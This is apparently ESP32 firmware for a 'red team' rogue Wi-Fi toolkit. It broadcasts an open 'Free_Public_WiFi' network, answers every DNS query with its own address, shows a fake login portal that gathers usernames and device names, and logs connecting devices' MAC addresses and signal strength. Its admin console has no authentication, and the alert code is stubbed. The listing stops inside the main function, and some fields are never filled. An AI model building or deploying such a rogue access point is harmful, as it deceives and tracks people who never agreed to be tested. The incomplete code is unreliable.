/*
 * ESP32 Advanced WiFi Captive Portal Toolkit
 * Professional Expert-Level Implementation
 * 
 * FOR AUTHORIZED TESTING AND EDUCATIONAL PURPOSES ONLY
 * 
 * Features:
 * - WiFi Access Point with custom SSID
 * - DNS redirection to captive portal
 * - HTTP server with login form
 * - Client logging (MAC, RSSI, hostname, timestamp)
 * - Telegram/Webhook alerting
 * - Admin interface at /admin
 * - Site survey mode
 * - SPIFFS/SD card logging
 * - Remote toggle capabilities
 * 
 * Target: ESP32 38-pin DevKit
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <sys/time.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "freertos/queue.h"

#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "esp_http_server.h"
#include "esp_spiffs.h"
#include "esp_timer.h"
#include "esp_mac.h"

#include "lwip/err.h"
#include "lwip/sys.h"
#include "lwip/sockets.h"
#include "lwip/dns.h"
#include "lwip/netdb.h"

#include "nvs_flash.h"
#include "driver/gpio.h"
#include "cJSON.h"

// Configuration constants
#define WIFI_SSID           "Free_Public_WiFi"
#define WIFI_PASS           ""  // Open network
#define WIFI_CHANNEL        6
#define MAX_STA_CONN        10
#define DNS_PORT            53
#define HTTP_PORT           80
#define ADMIN_PORT          8080

// GPIO Configuration
#define TOGGLE_BUTTON_PIN   GPIO_NUM_0  // Boot button
#define STATUS_LED_PIN      GPIO_NUM_2  // Built-in LED

// Logging Configuration
#define MAX_LOG_ENTRIES     1000
#define LOG_FILENAME        "/spiffs/clients.log"
#define CONFIG_FILENAME     "/spiffs/config.json"

// Alert Configuration
#define TELEGRAM_API_URL    "https://api.telegram.org/bot%s/sendMessage"
#define WEBHOOK_RETRY_COUNT 3
#define WEBHOOK_TIMEOUT_MS  5000

static const char *TAG = "CaptivePortal";

// System state
typedef struct {
    bool ap_enabled;
    bool server_enabled;
    bool site_survey_mode;
    char telegram_token[100];
    char telegram_chat_id[20];
    char webhook_url[256];
    uint32_t client_count;
    uint32_t total_connections;
} system_config_t;

typedef struct {
    uint8_t mac[6];
    int8_t rssi;
    char hostname[32];
    time_t connect_time;
    char ip_addr[16];
} client_info_t;

// Global variables
static system_config_t g_config = {
    .ap_enabled = true,
    .server_enabled = true,
    .site_survey_mode = false,
    .client_count = 0,
    .total_connections = 0
};

static httpd_handle_t g_server = NULL;
static httpd_handle_t g_admin_server = NULL;
static QueueHandle_t g_client_queue = NULL;
static client_info_t g_connected_clients[MAX_STA_CONN];
static int g_client_list_count = 0;

// DNS server socket
static int g_dns_socket = -1;

// Forward declarations
static void wifi_init_softap(void);
static void dns_server_task(void *pvParameters);
static esp_err_t start_web_server(void);
static esp_err_t start_admin_server(void);
static void client_logger_task(void *pvParameters);
static void button_task(void *pvParameters);
static void send_alert(const char* message);
static esp_err_t load_config(void);
static esp_err_t save_config(void);
static void site_survey_task(void *pvParameters);

// HTML Templates
static const char* captive_portal_html = R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free WiFi Access</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh; display: flex; align-items: center; justify-content: center;
        }
        .container { 
            background: white; padding: 40px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            max-width: 400px; width: 100%;
        }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { font-size: 24px; font-weight: bold; color: #333; margin-bottom: 10px; }
        .subtitle { color: #666; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 5px; color: #333; font-weight: 500; }
        .form-group input { 
            width: 100%; padding: 12px; border: 2px solid #e1e5e9; border-radius: 6px;
            font-size: 16px; transition: border-color 0.3s;
        }
        .form-group input:focus { outline: none; border-color: #667eea; }
        .submit-btn { 
            width: 100%; padding: 12px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 500;
            cursor: pointer; transition: transform 0.2s;
        }
        .submit-btn:hover { transform: translateY(-2px); }
        .disclaimer { 
            margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 6px;
            font-size: 12px; color: #666; text-align: center;
        }
        .warning { color: #e74c3c; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">🌐 Free WiFi Portal</div>
            <div class="subtitle">Connect to continue browsing</div>
        </div>
        
        <form method="POST" action="/login">
            <div class="form-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" name="username" required 
                       placeholder="Enter your username">
            </div>
            
            <div class="form-group">
                <label for="device">Device Name (Optional)</label>
                <input type="text" id="device" name="device" 
                       placeholder="e.g., John's iPhone">
            </div>
            
            <button type="submit" class="submit-btn">Connect to Internet</button>
        </form>
        
        <div class="disclaimer">
            <div class="warning">⚠️ TESTING ENVIRONMENT NOTICE</div>
            This is a controlled testing environment for authorized security research only.
            No real credentials are captured or stored. All activity is logged for testing purposes.
            <br><br>
            <strong>Do not enter real passwords or sensitive information.</strong>
        </div>
    </div>
</body>
</html>
)";

static const char* success_html = R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connection Successful</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0; padding: 20px; background: linear-gradient(135deg, #56ab2f 0%, #a8e6cf 100%);
            min-height: 100vh; display: flex; align-items: center; justify-content: center;
        }
        .container { 
            background: white; padding: 40px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            max-width: 400px; width: 100%; text-align: center;
        }
        .success-icon { font-size: 48px; margin-bottom: 20px; }
        .title { font-size: 24px; font-weight: bold; color: #27ae60; margin-bottom: 10px; }
        .message { color: #666; margin-bottom: 30px; }
        .info { background: #f8f9fa; padding: 15px; border-radius: 6px; font-size: 14px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-icon">✅</div>
        <div class="title">Connection Successful!</div>
        <div class="message">You are now connected to the internet.</div>
        <div class="info">
            <strong>Testing Environment Notice:</strong><br>
            This connection was established in a controlled testing environment.
            All activity has been logged for authorized security research purposes.
        </div>
    </div>
</body>
</html>
)";

// Admin interface HTML
static const char* admin_html_header = R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captive Portal Admin</title>
    <style>
        body { font-family: monospace; margin: 20px; background: #1a1a1a; color: #00ff00; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 30px; border-bottom: 1px solid #333; padding-bottom: 20px; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #2a2a2a; padding: 15px; border-radius: 5px; border: 1px solid #333; }
        .stat-value { font-size: 24px; font-weight: bold; color: #00ff41; }
        .stat-label { font-size: 12px; color: #888; }
        .controls { margin-bottom: 30px; }
        .btn { 
            background: #0066cc; color: white; border: none; padding: 10px 20px; 
            margin: 5px; border-radius: 3px; cursor: pointer; font-family: monospace;
        }
        .btn:hover { background: #0052a3; }
        .btn.danger { background: #cc0000; }
        .btn.danger:hover { background: #a30000; }
        .table-container { background: #2a2a2a; padding: 20px; border-radius: 5px; border: 1px solid #333; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
        th { background: #1a1a1a; color: #00ff41; }
        .timestamp { font-size: 11px; color: #888; }
        .refresh { float: right; }
    </style>
    <script>
        function toggleAP() { fetch('/admin/toggle_ap', {method: 'POST'}); setTimeout(() => location.reload(), 1000); }
        function toggleServer() { fetch('/admin/toggle_server', {method: 'POST'}); setTimeout(() => location.reload(), 1000); }
        function toggleSurvey() { fetch('/admin/toggle_survey', {method: 'POST'}); setTimeout(() => location.reload(), 1000); }
        function clearLogs() { if(confirm('Clear all logs?')) { fetch('/admin/clear_logs', {method: 'POST'}); setTimeout(() => location.reload(), 1000); } }
        setInterval(() => location.reload(), 10000);
    </script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 ESP32 Captive Portal Admin Console</h1>
            <p>Professional Red Team Testing Interface</p>
        </div>
)";

// WiFi event handler
static void wifi_event_handler(void* arg, esp_event_base_t event_base,
                                int32_t event_id, void* event_data)
{
    if (event_id == WIFI_EVENT_AP_STACONNECTED) {
        wifi_event_ap_staconnected_t* event = (wifi_event_ap_staconnected_t*) event_data;
        
        client_info_t client_info = {0};
        memcpy(client_info.mac, event->mac, 6);
        client_info.connect_time = time(NULL);
        
        // Get RSSI from station list
        wifi_sta_list_t wifi_sta_list = {0};
        esp_wifi_ap_get_sta_list(&wifi_sta_list);
        
        for (int i = 0; i < wifi_sta_list.num; i++) {
            if (memcmp(wifi_sta_list.sta[i].mac, event->mac, 6) == 0) {
                client_info.rssi = wifi_sta_list.sta[i].rssi;
                break;
            }
        }
        
        // Add to connected clients list
        if (g_client_list_count < MAX_STA_CONN) {
            g_connected_clients[g_client_list_count] = client_info;
            g_client_list_count++;
        }
        
        g_config.client_count++;
        g_config.total_connections++;
        
        // Queue for logging
        if (g_client_queue) {
            xQueueSend(g_client_queue, &client_info, 0);
        }
        
        ESP_LOGI(TAG, "Station "MACSTR" connected, RSSI: %d", 
                 MAC2STR(event->mac), client_info.rssi);
        
        // Send alert
        char alert_msg[256];
        snprintf(alert_msg, sizeof(alert_msg), 
                "🔍 New Client Connected\nMAC: "MACSTR"\nRSSI: %d dBm\nTime: %ld", 
                MAC2STR(event->mac), client_info.rssi, client_info.connect_time);
        send_alert(alert_msg);
        
    } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
        wifi_event_ap_stadisconnected_t* event = (wifi_event_ap_stadisconnected_t*) event_data;
        
        // Remove from connected clients list
        for (int i = 0; i < g_client_list_count; i++) {
            if (memcmp(g_connected_clients[i].mac, event->mac, 6) == 0) {
                for (int j = i; j < g_client_list_count - 1; j++) {
                    g_connected_clients[j] = g_connected_clients[j + 1];
                }
                g_client_list_count--;
                break;
            }
        }
        
        g_config.client_count--;
        
        ESP_LOGI(TAG, "Station "MACSTR" disconnected", MAC2STR(event->mac));
    }
}

// DNS server implementation
static void dns_server_task(void *pvParameters)
{
    struct sockaddr_in dest_addr = {
        .sin_addr.s_addr = htonl(INADDR_ANY),
        .sin_family = AF_INET,
        .sin_port = htons(DNS_PORT),
    };
    
    g_dns_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (g_dns_socket < 0) {
        ESP_LOGE(TAG, "Unable to create DNS socket");
        vTaskDelete(NULL);
        return;
    }
    
    int err = bind(g_dns_socket, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (err < 0) {
        ESP_LOGE(TAG, "DNS socket unable to bind");
        close(g_dns_socket);
        vTaskDelete(NULL);
        return;
    }
    
    ESP_LOGI(TAG, "DNS Server listening on port %d", DNS_PORT);
    
    while (1) {
        if (!g_config.ap_enabled) {
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        struct sockaddr_storage source_addr;
        socklen_t socklen = sizeof(source_addr);
        char rx_buffer[512];
        
        int len = recvfrom(g_dns_socket, rx_buffer, sizeof(rx_buffer) - 1, 0, 
                          (struct sockaddr *)&source_addr, &socklen);
        
        if (len < 0) {
            continue;
        }
        
        // Simple DNS response - redirect all queries to our IP
        if (len >= 12) {  // Minimum DNS header size
            char response[512];
            memcpy(response, rx_buffer, len);  // Copy query
            
            // Set response flags
            response[2] = 0x81;  // Response with recursion available
            response[3] = 0x80;  // No error
            
            // Add answer section pointing to our IP (192.168.4.1)
            uint8_t answer[] = {
                0xC0, 0x0C,              // Name pointer to query
                0x00, 0x01,              // Type A
                0x00, 0x01,              // Class IN
                0x00, 0x00, 0x00, 0x3C,  // TTL 60 seconds
                0x00, 0x04,              // Data length
                192, 168, 4, 1           // IP address
            };
            
            memcpy(response + len, answer, sizeof(answer));
            response[7] = 1;  // Answer count
            
            sendto(g_dns_socket, response, len + sizeof(answer), 0, 
                   (struct sockaddr *)&source_addr, socklen);
        }
    }
    
    close(g_dns_socket);
    vTaskDelete(NULL);
}

// HTTP handlers
static esp_err_t root_handler(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, captive_portal_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t login_handler(httpd_req_t *req)
{
    char buf[1024];
    char username[64] = {0};
    char device[64] = {0};
    
    // Get client IP and MAC
    int sockfd = httpd_req_to_sockfd(req);
    struct sockaddr_storage addr;
    socklen_t addr_size = sizeof(addr);
    getpeername(sockfd, (struct sockaddr *)&addr, &addr_size);
    
    struct sockaddr_in *s = (struct sockaddr_in *)&addr;
    char client_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &s->sin_addr, client_ip, INET_ADDRSTRLEN);
    
    // Parse form data
    if (httpd_req_recv(req, buf, sizeof(buf)) > 0) {
        // Simple form parsing
        char *username_start = strstr(buf, "username=");
        char *device_start = strstr(buf, "device=");
        
        if (username_start) {
            username_start += 9;  // Length of "username="
            char *username_end = strchr(username_start, '&');
            if (!username_end) username_end = username_start + strlen(username_start);
            int len = username_end - username_start;
            if (len > 0 && len < sizeof(username) - 1) {
                strncpy(username, username_start, len);
                username[len] = '\0';
            }
        }
        
        if (device_start) {
            device_start += 7;  // Length of "device="
            char *device_end = strchr(device_start, '&');
            if (!device_end) device_end = device_start + strlen(device_start);
            int len = device_end - device_start;
            if (len > 0 && len < sizeof(device) - 1) {
                strncpy(device, device_start, len);
                device[len] = '\0';
            }
        }
    }
    
    // Log the interaction (username only, no passwords)
    ESP_LOGI(TAG, "Login attempt - IP: %s, Username: %s, Device: %s", 
             client_ip, username, device);
    
    // Send alert
    char alert_msg[512];
    snprintf(alert_msg, sizeof(alert_msg), 
            "📝 Login Attempt\nIP: %s\nUsername: %s\nDevice: %s\nTime: %ld", 
            client_ip, username, device, time(NULL));
    send_alert(alert_msg);
    
    // Show success page
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, success_html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Admin handlers
static esp_err_t admin_handler(httpd_req_t *req)
{
    char response[8192];
    int len = 0;
    
    // Header
    len += snprintf(response + len, sizeof(response) - len, "%s", admin_html_header);
    
    // Stats
    len += snprintf(response + len, sizeof(response) - len,
        "<div class=\"stats\">"
        "<div class=\"stat-card\"><div class=\"stat-value\">%u</div><div class=\"stat-label\">Active Clients</div></div>"
        "<div class=\"stat-card\"><div class=\"stat-value\">%u</div><div class=\"stat-label\">Total Connections</div></div>"
        "<div class=\"stat-card\"><div class=\"stat-value\">%s</div><div class=\"stat-label\">AP Status</div></div>"
        "<div class=\"stat-card\"><div class=\"stat-value\">%s</div><div class=\"stat-label\">Server Status</div></div>"
        "</div>",
        g_config.client_count, g_config.total_connections,
        g_config.ap_enabled ? "ON" : "OFF",
        g_config.server_enabled ? "ON" : "OFF");
    
    // Controls
    len += snprintf(response + len, sizeof(response) - len,
        "<div class=\"controls\">"
        "<button class=\"btn\" onclick=\"toggleAP()\">Toggle AP</button>"
        "<button class=\"btn\" onclick=\"toggleServer()\">Toggle Server</button>"
        "<button class=\"btn\" onclick=\"toggleSurvey()\">%s Survey</button>"
        "<button class=\"btn danger\" onclick=\"clearLogs()\">Clear Logs</button>"
        "<button class=\"btn refresh\" onclick=\"location.reload()\">Refresh</button>"
        "</div>",
        g_config.site_survey_mode ? "Stop" : "Start");
    
    // Connected clients table
    len += snprintf(response + len, sizeof(response) - len,
        "<div class=\"table-container\">"
        "<h3>Connected Clients (%d)</h3>"
        "<table><tr><th>MAC Address</th><th>IP</th><th>RSSI</th><th>Connected</th><th>Hostname</th></tr>",
        g_client_list_count);
    
    for (int i = 0; i < g_client_list_count; i++) {
        client_info_t *client = &g_connected_clients[i];
        len += snprintf(response + len, sizeof(response) - len,
            "<tr><td>"MACSTR"</td><td>%s</td><td>%d dBm</td><td class=\"timestamp\">%ld</td><td>%s</td></tr>",
            MAC2STR(client->mac), client->ip_addr, client->rssi, 
            client->connect_time, client->hostname);
    }
    
    len += snprintf(response + len, sizeof(response) - len, "</table></div>");
    
    // Site survey results
    if (g_config.site_survey_mode) {
        len += snprintf(response + len, sizeof(response) - len,
            "<div class=\"table-container\">"
            "<h3>WiFi Site Survey (Refreshing...)</h3>"
            "<table><tr><th>SSID</th><th>Channel</th><th>RSSI</th><th>Auth</th></tr>");
        
        // This would be populated by the site survey task
        len += snprintf(response + len, sizeof(response) - len, 
            "<tr><td colspan=\"4\">Scanning for networks...</td></tr>");
        
        len += snprintf(response + len, sizeof(response) - len, "</table></div>");
    }
    
    // Footer
    len += snprintf(response + len, sizeof(response) - len,
        "</div></body></html>");
    
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, response, len);
    return ESP_OK;
}

static esp_err_t admin_toggle_ap_handler(httpd_req_t *req)
{
    g_config.ap_enabled = !g_config.ap_enabled;
    save_config();
    
    if (g_config.ap_enabled) {
        wifi_init_softap();
        ESP_LOGI(TAG, "AP enabled via admin");
    } else {
        esp_wifi_stop();
        ESP_LOGI(TAG, "AP disabled via admin");
    }
    
    httpd_resp_send(req, "OK", 2);
    return ESP_OK;
}

static esp_err_t admin_toggle_server_handler(httpd_req_t *req)
{
    g_config.server_enabled = !g_config.server_enabled;
    save_config();
    
    ESP_LOGI(TAG, "Server %s via admin", g_config.server_enabled ? "enabled" : "disabled");
    
    httpd_resp_send(req, "OK", 2);
    return ESP_OK;
}

static esp_err_t admin_toggle_survey_handler(httpd_req_t *req)
{
    g_config.site_survey_mode = !g_config.site_survey_mode;
    
    if (g_config.site_survey_mode) {
        xTaskCreate(site_survey_task, "site_survey", 4096, NULL, 5, NULL);
        ESP_LOGI(TAG, "Site survey started");
    } else {
        ESP_LOGI(TAG, "Site survey stopped");
    }
    
    httpd_resp_send(req, "OK", 2);
    return ESP_OK;
}

static esp_err_t admin_clear_logs_handler(httpd_req_t *req)
{
    FILE *f = fopen(LOG_FILENAME, "w");
    if (f) {
        fclose(f);
        ESP_LOGI(TAG, "Logs cleared via admin");
    }
    
    httpd_resp_send(req, "OK", 2);
    return ESP_OK;
}

// Web server setup
static esp_err_t start_web_server(void)
{
    if (g_server != NULL) {
        return ESP_OK;
    }
    
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.lru_purge_enable = true;
    config.server_port = HTTP_PORT;
    
    ESP_LOGI(TAG, "Starting web server on port %d", config.server_port);
    
    if (httpd_start(&g_server, &config) == ESP_OK) {
        httpd_uri_t root_uri = {
            .uri = "/",
            .method = HTTP_GET,
            .handler = root_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(g_server, &root_uri);
        
        httpd_uri_t login_uri = {
            .uri = "/login",
            .method = HTTP_POST,
            .handler = login_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(g_server, &login_uri);
        
        // Catch-all for captive portal detection
        httpd_uri_t catchall_uri = {
            .uri = "/*",
            .method = HTTP_GET,
            .handler = root_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(g_server, &catchall_uri);
        
        return ESP_OK;
    }
    
    ESP_LOGE(TAG, "Error starting web server");
    return ESP_FAIL;
}

static esp_err_t start_admin_server(void)
{
    if (g_admin_server != NULL) {
        return ESP_OK;
    }
    
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = ADMIN_PORT;
    
    ESP_LOGI(TAG, "Starting admin server on port %d", config.server_port);
    
    if (httpd_start(&g_admin_server, &config) == ESP_OK) {
        httpd_uri_t admin_uri = {
            .uri = "/admin",
            .method = HTTP_GET,
            .handler = admin_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(g_admin_server, &admin_uri);
        
        httpd_uri_t toggle_ap_uri = {
            .uri = "/admin/toggle_ap",
            .method = HTTP_POST,
            .handler = admin_toggle_ap_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(g_admin_server, &toggle_ap_uri);
        
        httpd_uri_t toggle_server_uri = {
            .uri = "/admin/toggle_server",
            .method = HTTP_POST,
            .handler = admin_toggle_server_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(g_admin_server, &toggle_server_uri);
        
        httpd_uri_t toggle_survey_uri = {
            .uri = "/admin/toggle_survey",
            .method = HTTP_POST,
            .handler = admin_toggle_survey_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(g_admin_server, &toggle_survey_uri);
        
        httpd_uri_t clear_logs_uri = {
            .uri = "/admin/clear_logs",
            .method = HTTP_POST,
            .handler = admin_clear_logs_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(g_admin_server, &clear_logs_uri);
        
        return ESP_OK;
    }
    
    ESP_LOGE(TAG, "Error starting admin server");
    return ESP_FAIL;
}

// WiFi initialization
static void wifi_init_softap(void)
{
    if (!g_config.ap_enabled) {
        return;
    }
    
    wifi_config_t wifi_config = {
        .ap = {
            .ssid_len = strlen(WIFI_SSID),
            .channel = WIFI_CHANNEL,
            .max_connection = MAX_STA_CONN,
            .authmode = WIFI_AUTH_OPEN,
            .pmf_cfg = {
                .required = false,
            },
        },
    };
    strcpy((char*)wifi_config.ap.ssid, WIFI_SSID);
    strcpy((char*)wifi_config.ap.password, WIFI_PASS);
    
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    
    ESP_LOGI(TAG, "WiFi AP started. SSID: %s, Channel: %d", WIFI_SSID, WIFI_CHANNEL);
}

// Alert system
static void send_alert(const char* message)
{
    if (strlen(g_config.telegram_token) > 0 && strlen(g_config.telegram_chat_id) > 0) {
        // Send Telegram alert (implementation would require HTTP client)
        ESP_LOGI(TAG, "Would send Telegram alert: %s", message);
    }
    
    if (strlen(g_config.webhook_url) > 0) {
        // Send webhook alert (implementation would require HTTP client)
        ESP_LOGI(TAG, "Would send webhook alert: %s", message);
    }
    
    // For now, just log to console
    ESP_LOGI(TAG, "ALERT: %s", message);
}

// Logging system
static void client_logger_task(void *pvParameters)
{
    client_info_t client_info;
    FILE *log_file;
    
    while (1) {
        if (xQueueReceive(g_client_queue, &client_info, portMAX_DELAY)) {
            // Write to SPIFFS log
            log_file = fopen(LOG_FILENAME, "a");
            if (log_file) {
                fprintf(log_file, "%ld,"MACSTR",%d,%s,%s\n",
                       client_info.connect_time,
                       MAC2STR(client_info.mac),
                       client_info.rssi,
                       client_info.hostname,
                       client_info.ip_addr);
                fclose(log_file);
            }
            
            // Also log to console for CLI parsing
            printf("CLIENT_LOG:%ld,"MACSTR",%d,%s,%s\n",
                   client_info.connect_time,
                   MAC2STR(client_info.mac),
                   client_info.rssi,
                   client_info.hostname,
                   client_info.ip_addr);
        }
    }
}

// Site survey implementation
static void site_survey_task(void *pvParameters)
{
    while (g_config.site_survey_mode) {
        wifi_scan_config_t scan_config = {
            .ssid = NULL,
            .bssid = NULL,
            .channel = 0,
            .show_hidden = true
        };
        
        ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, true));
        
        uint16_t number = 20;
        wifi_ap_record_t ap_info[20];
        ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&number, ap_info));
        
        ESP_LOGI(TAG, "Site Survey found %u networks:", number);
        for (int i = 0; i < number; i++) {
            ESP_LOGI(TAG, "SSID: %-32s Channel: %2d RSSI: %3d Auth: %d",
                     ap_info[i].ssid, ap_info[i].primary, ap_info[i].rssi, ap_info[i].authmode);
        }
        
        vTaskDelay(pdMS_TO_TICKS(10000));  // Scan every 10 seconds
    }
    
    vTaskDelete(NULL);
}

// Button handler
static void button_task(void *pvParameters)
{
    bool last_state = true;
    bool current_state;
    
    while (1) {
        current_state = gpio_get_level(TOGGLE_BUTTON_PIN);
        
        if (last_state && !current_state) {  // Button pressed
            vTaskDelay(pdMS_TO_TICKS(50));  // Debounce
            if (!gpio_get_level(TOGGLE_BUTTON_PIN)) {
                ESP_LOGI(TAG, "Button pressed - toggling AP");
                g_config.ap_enabled = !g_config.ap_enabled;
                save_config();
                
                gpio_set_level(STATUS_LED_PIN, g_config.ap_enabled ? 1 : 0);
                
                if (g_config.ap_enabled) {
                    wifi_init_softap();
                } else {
                    esp_wifi_stop();
                }
            }
        }
        
        last_state = current_state;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}

// Configuration management
static esp_err_t load_config(void)
{
    FILE *f = fopen(CONFIG_FILENAME, "r");
    if (f == NULL) {
        ESP_LOGI(TAG, "No config file found, using defaults");
        return ESP_OK;
    }
    
    char line[512];
    if (fgets(line, sizeof(line), f)) {
        cJSON *json = cJSON_Parse(line);
        if (json) {
            cJSON *item;
            
            if ((item = cJSON_GetObjectItem(json, "telegram_token"))) {
                strcpy(g_config.telegram_token, cJSON_GetStringValue(item));
            }
            if ((item = cJSON_GetObjectItem(json, "telegram_chat_id"))) {
                strcpy(g_config.telegram_chat_id, cJSON_GetStringValue(item));
            }
            if ((item = cJSON_GetObjectItem(json, "webhook_url"))) {
                strcpy(g_config.webhook_url, cJSON_GetStringValue(item));
            }
            
            cJSON_Delete(json);
        }
    }
    
    fclose(f);
    return ESP_OK;
}

static esp_err_t save_config(void)
{
    FILE *f = fopen(CONFIG_FILENAME, "w");
    if (f == NULL) {
        return ESP_FAIL;
    }
    
    cJSON *json = cJSON_CreateObject();
    cJSON_AddStringToObject(json, "telegram_token", g_config.telegram_token);
    cJSON_AddStringToObject(json, "telegram_chat_id", g_config.telegram_chat_id);
    cJSON_AddStringToObject(json, "webhook_url", g_config.webhook_url);
    cJSON_AddBoolToObject(json, "ap_enabled", g_config.ap_enabled);
    cJSON_AddBoolToObject(json, "server_enabled", g_config.server_enabled);
    
    char *json_string = cJSON_Print(json);
    fprintf(f, "%s", json_string);
    
    free(json_string);
    cJSON_Delete(json);
    fclose(f);
    
    return ESP_OK;
}

// SPIFFS initialization
static esp_err_t init_spiffs(void)
{
    ESP_LOGI(TAG, "Initializing SPIFFS");
    
    esp_vfs_spiffs_conf_t conf = {
        .base_path = "/spiffs",
        .partition_label = NULL,
        .max_files = 5,
        .format_if_mount_failed = true
    };
    
    esp_err_t ret = esp_vfs_spiffs_register(&conf);
    
    if (ret != ESP_OK) {
        if (ret == ESP_FAIL) {
            ESP_LOGE(TAG, "Failed to mount or format filesystem");
        } else if (ret == ESP_ERR_NOT_FOUND) {
            ESP_LOGE(TAG, "Failed to find SPIFFS partition");
        } else {
            ESP_LOGE(TAG, "Failed to initialize SPIFFS (%s)", esp_err_to_name(ret));
        }
        return ret;
    }
    
    size_t total = 0, used = 0;
    ret = esp_spiffs_info(NULL, &total, &used);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to get SPIFFS partition information (%s)", esp_err_to_name(ret));
    } else {
        ESP_LOGI(TAG, "SPIFFS: %d kB total, %d kB used", total / 1024, used / 1024);
    }
    
    return ESP_OK;
}

// Main application
extern "C" void app_main(void)
{
    // Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    
    // Initialize SPIFFS
    ESP_ERROR_CHECK(init_spiffs());
    
    // Load configuration
    load_config();
    
    // Initialize GPIO
    gpio_config_t io_conf = {
        .intr_type = GPIO_INTR_DISABLE,
        .mode = GPIO_MODE_INPUT,
        .pin_bit_mask = (1ULL << TOGGLE_BUTTON_PIN),
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .pull_up_en = GPIO_PULLUP_ENABLE,
    };
    gpio_config(&io_conf);
    
    io_conf.mode = GPIO_MODE_OUTPUT;
    io_conf.pin_bit_mask = (1ULL << STATUS_LED_PIN);
    io_conf.pull_up_en = GPIO_PULLUP_DISABLE;
    gpio_config(&io_conf);
    
    gpio_set_level(STATUS_LED_PIN, 1);  // LED on by default
    
    // Initialize networking
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_ap();
    
    // Initialize WiFi
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &wifi_event_handler,
                                                        NULL,
                                                        NULL));
    
    // Create queues and tasks
    g_client_queue = xQueueCreate(10, sizeof(client_info_t));
    
    xTaskCreate(dns_server_task, "dns_server", 4096, NULL, 5, NULL);
    xTaskCreate(client_logger_task, "client_logger", 4096, NULL, 5, NULL);
    xTaskCreate(button_task, "button_handler", 2048, NULL, 5, NULL);
    
    // Start services
    wifi_init_softap();
    start_web_server();
    start_admin_server();
    
    ESP_LOGI(TAG, "🔒 ESP32 Advanced Captive Portal Started");
    ESP_LOGI(TAG, "📡 SSID: %s", WIFI_SSID);
    ESP_LOGI(TAG, "🌐 Captive Portal: http://192.168.4.1");
    ESP_LOGI(TAG, "⚙️  Admin Interface: http://192.168.4.1:8080/admin");
